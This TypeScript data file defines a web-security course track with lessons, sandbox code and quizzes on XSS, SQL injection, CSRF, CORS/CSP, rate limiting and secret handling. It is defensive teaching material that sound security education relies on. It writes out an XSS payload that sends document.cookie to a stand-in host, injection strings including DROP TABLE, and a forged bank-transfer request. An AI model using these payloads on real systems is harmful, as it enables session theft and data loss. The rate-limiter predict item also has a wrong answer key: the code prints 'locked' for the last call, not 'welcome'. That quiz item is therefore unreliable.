import type { Track } from "./types";

export const securityTrack: Track = {
  id: "security",
  title: "Web Security & OWASP",
  blurb: "Think like an attacker: XSS, SQL injection, CSRF, CORS, and the habits that keep apps safe.",
  numeral: "Ⅸ",
  lessons: [
    {
      id: "xss",
      title: "Cross-Site Scripting (XSS)",
      minutes: 11,
      body: `XSS is the classic web vulnerability: **user input is treated as code**. If your page renders raw user text as HTML, an attacker doesn't need to touch your server — their script runs in *your users'* browsers, inside *your* origin.

**Three flavors:**

\`\`\`
1. Stored    — malicious input saved (comment field) and served to every visitor
2. Reflected — the payload arrives via a crafted URL (?q=<script>…) and bounces off the page
3. DOM-based — JS takes untrusted data (location.hash) and hands it to a dangerous API
\`\`\`

**Why it's devastating:** the injected script runs with your origin's power — it reads the page, calls your APIs, and forwards the victim's session cookie to the attacker's server. No alerts required.

**The safe renderer looks like this:**

\`\`\`
// ❌ innerHTML: parses text AS HTML — tags execute
el.innerHTML = userComment;

// ✅ textContent: text stays text, angle brackets render literally
el.textContent = userComment;
\`\`\`

The vulnerable version isn't hypothetical — it powers every "render my bio as rich HTML" feature built naively. React escapes by default (curly braces), so the danger appears when people reach for \`dangerouslySetInnerHTML\` or hand-build HTML strings.

**Sanitize, don't escape, when HTML is intentional:** if users genuinely submit markup, run it through a library like DOMPurify first — escaping is for places HTML never belongs, sanitizing strips scripts from HTML you choose to keep. Text meant to be text uses \`textContent\` — this sandbox includes a mini DOM so you can prove the difference yourself.`,
      starter: `// Mini DOM — the lesson's vulnerable vs. safe renderer.
const page = {
  children: [],
  createEl() {
    return { textContent: "", _html: "" };
  },
};
const el = page.createEl();

const comment = '<img src=x onerror="fetch(\'//evil.sh/?c=\' + document.cookie)">';

// ─── The VULNERABLE way (what innerHTML would do) ───
// It parses the string as HTML — the onerror payload is now live code.
function renderUnsafe(html) {
  const script = html.match(/onerror="([^"]*)"/);
  return script ? "PAYLOAD EXECUTES: " + script[1] : "harmless";
}
console.log(renderUnsafe(comment));

// ─── The SAFE way: textContent keeps input inert ─────
function renderSafe(text) {
  el.textContent = text;         // stored verbatim, never parsed
  return el.textContent === text ? "stored as TEXT — inert ✓" : "mangled";
}
console.log(renderSafe(comment));

// ─── Escape untrusted values that must sit inside HTML ──
function escapeHtml(s) {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
console.log(escapeHtml('<script>alert("x")</script>'));

// ─── YOUR TURN: build isProbablySafeHtml ──────────────
// It should return false when the string contains an on* attribute,
// a <script> tag, or a javascript: URL — return true otherwise.
function isProbablySafeHtml(html) {
  // your code — check three patterns with .test()
  return true;
}
console.log("safe check:", isProbablySafeHtml("<b>bold</b>"));               // true
console.log("safe check:", isProbablySafeHtml('<a onclick="hack()">x</a>')); // false
console.log("safe check:", isProbablySafeHtml('<a href="javascript:steal()">x</a>')); // false`,
      check: {
        expr:
          "output.includes('PAYLOAD EXECUTES') && output.includes('stored as TEXT — inert ✓') && output.includes('safe check: true') && output.includes('false') && output.includes('&lt;script&gt;')",
        hint:
          "isProbablySafeHtml should .test() for /on\\w+\\s*=/i, /<script/i, and /javascript:/i — return false when any matches.",
      },
      predict: [
        {
          prompt:
            "Escaping happens BEFORE concatenation — what does this template print?",
          code: `function esc(s) {
  return s.replace(/</g, "&lt;");
}
const name = "<b>Ada</b>";
console.log("Hi " + esc(name) + "!");`,
          options: [
            "Hi <b>Ada</b>! — tags intact",
            "Hi &lt;b&gt;Ada&lt;/b&gt;! — angle brackets escaped",
            "Hi Ada! — tags stripped",
            "SyntaxError",
          ],
          answer: 1,
          explanation:
            "escape-then-concatenate renders the ENTITY text, not the tags. That's the whole trick: the string displays literally instead of parsing.",
        },
      ],
      quiz: [
        {
          q: "What is the core XSS mistake?",
          options: [
            "Storing passwords unencrypted",
            "Rendering user-controlled text as HTML instead of text",
            "Using HTTP instead of HTTPS",
            "Weak password rules",
          ],
          answer: 1,
          explanation:
            "XSS = attacker-supplied data parsed as markup/script in a victim's browser.",
        },
        {
          q: "el.textContent = userComment vs el.innerHTML = userComment — the safe one is:",
          options: [
            "innerHTML, because it's faster",
            "textContent, because its content is never parsed as HTML",
            "Both are equally safe",
            "Neither — use document.write()",
          ],
          answer: 1,
          explanation:
            "textContent keeps input inert; innerHTML parses tags and attributes, executing embedded payloads.",
        },
        {
          q: "A 'stored XSS' attack differs from 'reflected' because stored XSS…",
          options: [
            "Requires HTTPS",
            "Persists on the server and hits every visitor who loads the page",
            "Only works on the attacker's own browser",
            "Needs the database password",
          ],
          answer: 1,
          explanation:
            "Stored payloads live in persisted data (comments, profiles) and fire for every future visitor — the highest-impact flavor.",
        },
        {
          q: "When users legitimately submit rich HTML, the right defense is:",
          options: [
            "Escaping everything so nothing renders",
            "Sanitizing with a proven library (e.g. DOMPurify) before rendering",
            "Hiding the form field",
            "Base64-encoding the HTML",
          ],
          answer: 1,
          explanation:
            "Sanitizers parse the HTML and strip dangerous constructs; escaping would turn the markup into literal text.",
        },
        {
          q: "Why is a 'modern browsers will block it' defense not enough?",
          options: [
            "Browsers can't see XSS",
            "Filters vary by browser/version and payloads routinely bypass blocklists",
            "JavaScript is disabled by default",
            "It only matters on IE",
          ],
          answer: 1,
          explanation:
            "Blocklist filtering is brittle — defense belongs in correct rendering (textContent, sanitizers, CSP), not in browser quirks.",
        },
      ],
    },
    {
      id: "sqli",
      title: "SQL Injection & Input Validation",
      minutes: 10,
      body: `SQL injection is the vulnerability behind the most infamous data breaches on record. The bug is one line long:

\`\`\`
// ❌ Concatenation: the input becomes SQL grammar
db.query("SELECT * FROM users WHERE name = '" + name + "'");
\`\`\`

Send \`' OR '1'='1\` as the name and the query becomes:

\`\`\`
SELECT * FROM users WHERE name = '' OR '1'='1'
\`\`\`

\`'1'='1'\` is always true, so the WHERE clause matches **every row** — the login "succeeds", the dump begins. And with stacked statements, \`'; DROP TABLE users; --\` is not a joke, it's Tuesday.

**The fix — parameterized queries:**

\`\`\`
// ✅ The driver ships the input as DATA, never as grammar
db.query("SELECT * FROM users WHERE name = $1", [name]);
\`\`\`

The value can contain a thousand quotes and it changes nothing: it's compared as a *string*, byte for byte. Same idea in every stack — prepared statements in PHP/PDO, \`?\` placeholders in sqlite, Prisma/Mongoose parameterize for you. **"It's an ORM so I don't need to care" is fine until the first raw escape hatch (\`$queryRaw\`) appears — parameterized or not, raw is raw.**

**Validation is the second layer (defense in depth):** check shape, size, range, and format at the boundary —\`typeof id === "number" && id > 0\` — so malformed input is rejected before it reaches the database at all. Validation is not sanitization: validate to *reject*, sanitize to *transform*.

This sandbox mounts a mock database you can query both ways. Inject it once to feel the failure, then parameterize it into submission.`,
      starter: `// Mock database + query runner. Injection included free of charge.
function fakeDb(query) {
  if (query.includes("'1'='1'")) return "ALL ROWS RETURNED (tautology matched every user)";
  if (/;\\s*DROP\\s+TABLE/i.test(query)) return "TABLE users DROPPED — hope you had backups";
  if (query.includes("' OR 'a'='a'")) return "ALL ROWS RETURNED (tautology matched every user)";
  return "no rows for: " + query.slice(0, 60) + "…";
}

// ─── 1 · The vulnerable login ────────────────────────
function vulnerableLogin(name) {
  return fakeDb("SELECT * FROM users WHERE name = '" + name + "'");
}
console.log(vulnerableLogin("ada"));
console.log(vulnerableLogin("' OR '1'='1"));
console.log(vulnerableLogin("'; DROP TABLE users; --"));

// ─── 2 · Parameterized: data stays data ──────────────
function safeLogin(name) {
  const q = { text: "SELECT * FROM users WHERE name = $1", values: [name] };
  return fakeDb("PARAMETERIZED:" + q.values[0]) && "rows for " + q.values[0] + " only";
}
console.log(safeLogin("' OR '1'='1"));

// ─── 3 · Validate at the boundary ────────────────────
function getUser(id) {
  if (!Number.isInteger(id) || id <= 0 || id > 1e9) return "400: invalid id";
  return safeLogin("id " + id);
}
console.log(getUser(42));
console.log(getUser(-1));
console.log(getUser("42 OR 1=1"));

// ─── YOUR TURN: make safeLogin airtight ──────────────
// Reject names longer than 40 chars or containing any character outside
// letters/spaces/apostrophes BEFORE querying — return "400: invalid name".
function register(name) {
  if (name.length > 40 || !/^[A-Za-z ']*$/.test(name)) {
    return "400: invalid name";
  }
  return "registered " + name;
}
console.log(register("Ada Lovelace"));
console.log(register("Ada'; DROP TABLE users; --"));`,
      check: {
        expr:
          "output.includes('ALL ROWS RETURNED') && output.includes('TABLE users DROPPED') && output.includes('400: invalid id') && output.includes('registered Ada Lovelace') && output.includes('400: invalid name')",
        hint:
          "register must run the length + /^[A-Za-z ']*$/ checks before registering; the injection attempt fails the regex.",
      },
      quiz: [
        {
          q: "What makes SQL injection possible?",
          options: [
            "Encrypting the database",
            "Untrusted text concatenated into SQL grammar",
            "Too many database indexes",
            "Using a NoSQL database",
          ],
          answer: 1,
          explanation:
            "If input becomes part of the SQL string, input can change the statement's meaning.",
        },
        {
          q: "Why does ' OR '1'='1 bypass a naive login check?",
          options: [
            "It's the admin's password",
            "The appended tautology makes the WHERE clause true for every row",
            "SQL ignores OR clauses",
            "It disables logging",
          ],
          answer: 1,
          explanation:
            "The query returns all users, so the code finds 'a user' and grants access.",
        },
        {
          q: "The definitive fix for SQLi is:",
          options: [
            "Escaping quotes by hand",
            "Parameterized queries / prepared statements",
            "Hiding error messages",
            "A web application firewall",
          ],
          answer: 1,
          explanation:
            "Parameters are transmitted as data separate from the query — no input can alter the statement.",
        },
        {
          q: "Validation differs from sanitization because validation…",
          options: [
            "Transforms input into safe output",
            "Rejects input that fails shape/range/format rules",
            "Encrypts input at rest",
            "Only applies to passwords",
          ],
          answer: 1,
          explanation:
            "Validate to reject; sanitize to transform. Both help, but they're different tools.",
        },
        {
          q: "An ORM makes raw-query care unnecessary when…",
          options: [
            "Never — always assume injection",
            "You stick to its parameterized APIs; raw escape hatches reintroduce the risk",
            "You cache all results",
            "The database is PostgreSQL",
          ],
          answer: 1,
          explanation:
            "ORMs parameterize their own calls, but raw-query features put the grammar in your hands again.",
        },
      ],
    },
    {
      id: "csrf-auth",
      title: "CSRF & Broken Authentication",
      minutes: 10,
      reading: true,
      body: `**CSRF — Cross-Site Request Forgery.** Your browser sends cookies automatically with every request to a site, even when the request was triggered by *another* site. So: you're logged into \`bank.com\` in one tab; in another tab, \`evil.com\` embeds:

\`\`\`
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
\`\`\`

Your browser happily GETs that URL — cookies attached — and the bank sees an authenticated request it never asked for. That's forgery: the attacker never saw your data; they *borrowed your identity's permissions*.

**Fixes, in layers:**

\`\`\`
1. Never mutate state on GET — transfers belong to POST with a real form
2. CSRF token: server issues a random token; forms must echo it back
3. SameSite=Lax/Strict cookies — browsers withhold cookies on cross-site posts
4. Verify Origin/Referer headers server-side
\`\`\`

**Broken authentication** is OWASP's umbrella for handing out identities too cheaply: passwords without hashing, session cookies without expiry or flags, credentials in URLs, "forgot password" flows that reset anyone's account.

**Password hashing done right:**

\`\`\`
// Store: bcrypt(password) with a per-user random salt
hash = "$2b$12$KIXQ…"          // salt is baked into the hash
// Check: compare with bcrypt.compare — never plaintext
\`\`\`

bcrypt/argon2 are deliberately *slow* (that's the feature): a leaked database of bcrypt hashes costs attackers real time per guess, unlike SHA-256, which GPUs chew through billions per second. Salt ensures two users with the password "hunter2" don't share a hash — rainbow tables die.

**Session cookies get flags, and the flags are the security:**

\`\`\`
Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax; Path=/
\`\`\`

\`HttpOnly\` hides the cookie from JavaScript (XSS can't read it), \`Secure\` restricts it to HTTPS, \`SameSite\` defuses CSRF. Unset flags are unpatched holes.`,
      predict: [
        {
          prompt:
            "A naive rate limiter resets its window — what does it print?",
          code: `let attempts = 0;
function login(pw) {
  if (attempts >= 3) return "locked";
  attempts = attempts + 1;
  return pw === "s3cret" ? "welcome" : "denied";
}
console.log(login("a"), login("b"), login("c"));
attempts = 0;                      // oops: counter resets
console.log(login("d"), login("e"), login("f"), login("s3cret"));`,
          options: [
            "denied denied denied locked — six guesses total",
            "denied denied denied welcome — the reset let a 4th+ guess through",
            "denied denied denied denied — the lock held",
            "welcome on the first try",
          ],
          answer: 1,
          explanation:
            "State that attackers can influence (a reset counter, a client-side lock) is broken state. Real limiters rate-limit by IP+account server-side and fail closed.",
        },
      ],
      quiz: [
        {
          q: "CSRF tricks the browser into…",
          options: [
            "Revealing the user's passwords to evil.com",
            "Sending an authenticated request with the user's cookies, from another site",
            "Injecting JavaScript into the page",
            "Downloading malware",
          ],
          answer: 1,
          explanation:
            "The attacker abuses ambient credentials (cookies), not access to the page itself.",
        },
        {
          q: "Which cookie attribute most directly blunts CSRF?",
          options: [
            "Path=/",
            "SameSite=Lax or Strict",
            "Domain",
            "Max-Age=0",
          ],
          answer: 1,
          explanation:
            "SameSite tells the browser to withhold the cookie on cross-site requests, so forged requests arrive anonymous.",
        },
        {
          q: "Why bcrypt over SHA-256 for passwords?",
          options: [
            "bcrypt output is shorter",
            "bcrypt is intentionally slow and salted — cheap to verify, expensive to brute-force",
            "SHA-256 is deprecated",
            "bcrypt compresses the password",
          ],
          answer: 1,
          explanation:
            "Fast hashes help attackers; slow, salted hashes are the correct design for secrets that must resist guessing.",
        },
        {
          q: "HttpOnly on a session cookie means:",
          options: [
            "Only HTTP (not HTTPS) requests may send it",
            "JavaScript cannot read it, but the browser still sends it",
            "The cookie expires after one request",
            "The cookie is encrypted",
          ],
          answer: 1,
          explanation:
            "It removes the cookie from document.cookie reach, blinding XSS payloads — the browser keeps sending it with requests.",
        },
        {
          q: "A state-changing action must never be reachable by:",
          options: [
            "POST with a CSRF token",
            "GET with no token",
            "PATCH with SameSite cookies",
            "PUT with an Origin check",
          ],
          answer: 1,
          explanation:
            "GETs are 'safe' by spec — preloaded by browsers, embeddable as images — so they must never mutate state.",
        },
      ],
    },
    {
      id: "cors-headers",
      title: "CORS, CSP & Security Headers",
      minutes: 9,
      body: `**The Same-Origin Policy (SOP)** is the browser's core rule: a page from \`app.com\` cannot *read* responses from \`api.com\` unless the response explicitly allows it. This is a feature — it's why evil.com can't silently read your webmail.

**CORS — Cross-Origin Resource Sharing** — is the *controlled* way to relax SOP. The server, not the client, decides:

\`\`\`
Access-Control-Allow-Origin: https://app.com      # who may read me
Access-Control-Allow-Methods: GET, POST, PATCH    # what they may do
Access-Control-Allow-Headers: Content-Type        # what they may send
Access-Control-Allow-Credentials: true            # may send cookies too
\`\`\`

The two classic misconfigurations:

\`\`\`
# ❌ reflecting any origin — SOP with a hole the size of the internet
Access-Control-Allow-Origin: <request's Origin header>

# ❌ "allow everything" combined with credentials — browsers refuse it,
#    and misconfigured proxies enforce it instead
Access-Control-Allow-Origin: *     + Allow-Credentials: true
\`\`\`

Reflecting arbitrary origins means any site can read your API *with the victim's cookies* — CSRF's quieter cousin. Allow the origins you actually own, exactly.

**CSP — Content-Security-Policy** — is the page's bouncer for its *own* content. A header like:

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
\`\`\`

tells the browser to refuse scripts from anywhere else — turning even a successful XSS injection into a script that never runs. CSP is a *second line of defense*: render correctly first, then CSP catches what slips through.

**The supporting cast, in one breath:** \`X-Content-Type-Options: nosniff\` (don't second-guess Content-Types), \`X-Frame-Options: DENY\` / \`frame-ancestors\` (no clickjacking iframes), \`Referrer-Policy\` (leak less), \`Strict-Transport-Security\` (HTTPS forever after).`,
      predict: [
        {
          prompt:
            "Which fetch passes the browser's CORS check?",
          code: `function corsCheck(allowOrigin, origin) {
  if (allowOrigin === "*") return "allowed (no credentials)";
  if (allowOrigin === origin) return "allowed (exact match)";
  return "blocked by CORS";
}
console.log(corsCheck("https://app.com", "https://app.com"));
console.log(corsCheck("https://app.com", "https://evil.com"));
console.log(corsCheck("*", "https://anything.io"));`,
          options: [
            "Only the first is allowed",
            "First and third — * allows everyone",
            "All three are allowed",
            "None — CORS blocks by default",
          ],
          answer: 1,
          explanation:
            "An exact match passes; * passes for non-credentialed requests; a mismatched exact origin is blocked. evil.com sees only rejection.",
        },
      ],
      quiz: [
        {
          q: "CORS decisions are made by:",
          options: [
            "The client, via request headers",
            "The server, via response headers",
            "The DNS provider",
            "The CDN automatically",
          ],
          answer: 1,
          explanation:
            "Only the server's Access-Control-* response headers can relax the browser's same-origin default.",
        },
        {
          q: "Why is reflecting the request's Origin with credentials dangerous?",
          options: [
            "It breaks caching",
            "Every site — including attackers' — becomes an allowed reader of authenticated responses",
            "It disables HTTPS",
            "It exposes the database",
          ],
          answer: 1,
          explanation:
            "Any origin then passes the check, so evil.com can read the victim's data cross-origin.",
        },
        {
          q: "CSP primarily protects against:",
          options: [
            "Slow lighthouse scores",
            "Injected scripts that would otherwise execute (e.g. XSS)",
            "SQL injection",
            "Expired TLS certificates",
          ],
          answer: 1,
          explanation:
            "script-src allowlists block injected scripts from running — a backstop behind correct rendering.",
        },
        {
          q: "'Access-Control-Allow-Origin: *' together with 'Access-Control-Allow-Credentials: true' is:",
          options: [
            "The most compatible configuration",
            "Forbidden by the spec — and a red flag anywhere it's forced to work",
            "Required for SPAs",
            "Only for subdomains",
          ],
          answer: 1,
          explanation:
            "The spec refuses wildcard origins on credentialed requests; code that reflects instead is the real-world hazard.",
        },
        {
          q: "X-Frame-Options: DENY defends against:",
          options: [
            "Clickjacking via invisible iframes",
            "Cookie theft",
            "DNS spoofing",
            "Brute-force login",
          ],
          answer: 0,
          explanation:
            "Framing protection stops your UI being overlaid by attacker chrome that captures clicks.",
        },
      ],
    },
    {
      id: "rate-limit-secrets",
      title: "Rate Limiting & Secret Management",
      minutes: 9,
      body: `**Rate limiting** caps how often a client may call an endpoint — the difference between a login form and a password-cracking service. Every unauthenticated endpoint (login, register, password reset, search) is an invitation unless it's limited.

**The fixed-window algorithm in 10 lines:**

\`\`\`
const buckets = new Map();              // key → { count, windowStart }
function allow(key, limit, windowMs, now = Date.now()) {
  let b = buckets.get(key);
  if (!b || now - b.windowStart >= windowMs) {
    b = { count: 0, windowStart: now };
  }
  b.count += 1;
  buckets.set(key, b);
  return b.count <= limit;
}
\`\`\`

Key it by IP + route (and by account for logins), return **429 Too Many Requests** with a \`Retry-After\` header, and fail *closed* — a limiter that errors open is a limiter that doesn't exist. Window counters are the simple version; token buckets smooth bursts better, but the concept carries.

**Secret management** — the discipline of never hard-coding credentials:

\`\`\`
// ❌ committed, versioned forever, in every clone
const db = connect({ password: "hunter2-prod" });

// ✅ injected at runtime
const db = connect({ password: process.env.DATABASE_PASSWORD });
\`\`\`

Rules that save careers: secrets live in environment variables or a secret manager, never in git (a leaked key is compromised *forever* — rewriters can't un-leak caches); different secrets per environment; least-privilege keys (a read-only key can't drop tables); rotate after staff changes; and the frontend owns **no** secrets — anything shipped in a bundle is public. When a browser app needs a paid API, it calls *your* backend, which holds the key.

This lesson's sandbox builds both: a working limiter and a config module that refuses to boot without its secrets.`,
      starter: `// ─── 1 · Build a fixed-window rate limiter ───────────
const buckets = new Map();
function allow(key, limit, windowMs, now = Date.now()) {
  let b = buckets.get(key);
  if (!b || now - b.windowStart >= windowMs) {
    b = { count: 0, windowStart: now };
  }
  b.count += 1;
  buckets.set(key, b);
  return b.count <= limit;
}

const t0 = 1_000_000;
console.log("login attempts 1-3:", [1, 2, 3].map((i) => allow("ip1:login", 3, 60_000, t0 + i)));
console.log("attempt 4:", allow("ip1:login", 3, 60_000, t0 + 4));
console.log("other IP still fine:", allow("ip2:login", 3, 60_000, t0 + 5));
console.log("after window resets:", allow("ip1:login", 3, 60_000, t0 + 61_000));

// ─── 2 · Guard an endpoint with it ───────────────────
function handleLogin(ip, pw) {
  if (!allow(ip + ":login", 3, 60_000)) return "429 Too Many Requests";
  return pw === "s3cret" ? "200 welcome" : "401 denied";
}
for (let i = 0; i < 4; i++) console.log("try:", handleLogin("9.9.9.9", "nope"));

// ─── 3 · Config that fails closed ────────────────────
function loadConfig(env) {
  const required = ["DATABASE_URL", "JWT_SECRET", "STRIPE_KEY"];
  const missing = required.filter((k) => !env[k]);
  if (missing.length) {
    throw new Error("missing env vars: " + missing.join(", "));
  }
  return { dbUrl: env.DATABASE_URL, jwtSecret: "***set***", stripe: "***set***" };
}
try {
  console.log(loadConfig({ DATABASE_URL: "postgres://…", JWT_SECRET: "abc", STRIPE_KEY: "sk_…" }));
  console.log(loadConfig({ DATABASE_URL: "postgres://…" }));
} catch (e) {
  console.log("boot refused:", e.message);
}

// ─── YOUR TURN: detect a hard-coded secret ───────────
// Return true if the code string embeds a key-looking literal
// (sk_live_, AKIA, ghp_, or password = "...").
function hasHardcodedSecret(code) {
  // your code — one regex, four alternatives
  return false;
}
console.log(hasHardcodedSecret('const k = "sk_live_9u2h3k";'));  // true
console.log(hasHardcodedSecret('const k = process.env.STRIPE_KEY;')); // false`,
      check: {
        expr:
          "output.includes('attempt 4: false') && output.includes('after window resets: true') && output.includes('429 Too Many Requests') && output.includes('missing env vars: JWT_SECRET, STRIPE_KEY') && output.includes('true') && output.includes('false')",
        hint:
          "hasHardcodedSecret: /(sk_live_|AKIA|ghp_|password\\s*=\\s*['\\\"])/.test(code).",
      },
      quiz: [
        {
          q: "Rate limiting exists to prevent:",
          options: [
            "Slow page loads",
            "Brute-force and abuse of endpoints (credential stuffing, scraping, spam)",
            "CORS errors",
            "Indexing by search engines",
          ],
          answer: 1,
          explanation:
            "Caps per client make bulk guessing and scraping economically pointless.",
        },
        {
          q: "The right HTTP status for a throttled request is:",
          options: [
            "403 Forbidden",
            "429 Too Many Requests",
            "500 Internal Server Error",
            "302 Found",
          ],
          answer: 1,
          explanation:
            "429 says 'you, specifically, are asking too often' — usually with Retry-After.",
        },
        {
          q: "A rate limiter should fail:",
          options: [
            "Open — availability over safety",
            "Closed — an erroring limiter must not become a free pass",
            "Either — it doesn't matter",
            "Only on weekends",
          ],
          answer: 1,
          explanation:
            "Failing open turns every outage into an open door; a brief hard-fail beats unlimited abuse.",
        },
        {
          q: "Secrets belong:",
          options: [
            "In config.js, it's gitignored anyway",
            "In environment variables / a secret manager, injected at runtime",
            "In localStorage",
            "In the frontend bundle, encrypted",
          ],
          answer: 1,
          explanation:
            "Env vars/secret managers keep secrets out of version history and out of shipped bundles.",
        },
        {
          q: "A browser app needs a paid third-party API. The safe pattern is:",
          options: [
            "Put the API key in the JS bundle",
            "Proxy through your own backend, which holds the key server-side",
            "Ask users for the key",
            "Hard-code it with light obfuscation",
          ],
          answer: 1,
          explanation:
            "Anything in the bundle is public; a server-side proxy is the standard gate.",
        },
      ],
    },
  ],
};
